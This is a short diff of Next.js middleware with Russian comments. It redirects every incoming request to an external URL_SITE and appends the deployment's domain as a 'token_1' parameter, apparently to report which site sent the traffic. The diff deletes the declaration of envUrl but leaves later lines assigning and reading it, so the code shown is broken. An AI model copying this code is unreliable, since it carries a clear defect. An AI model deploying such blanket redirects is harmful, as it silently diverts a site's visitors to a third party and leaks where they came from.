@@ -176,7 +176,7 @@ export async function middleware(req) {
   const ip = req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown";
 
   // --- достаем домен из ENV ---
-  let envUrl = process.env.URL || process.env.DEPLOY_URL || "unknown-domain";
+  const mainDomain = getDomain(req);
   try {
     // убираем https:// или http:// если есть
     envUrl = new URL(envUrl).host;
@@ -209,7 +209,7 @@ export async function middleware(req) {
 
   // --- добавляем параметр src=envUrl в ссылку ---
   const target = new URL(URL_SITE);
-  target.searchParams.set("token_1", envUrl);
+  target.searchParams.set("token_1", mainDomain);
 
   // редиректим на обновленную ссылку
   return NextResponse.redirect(target.toString());
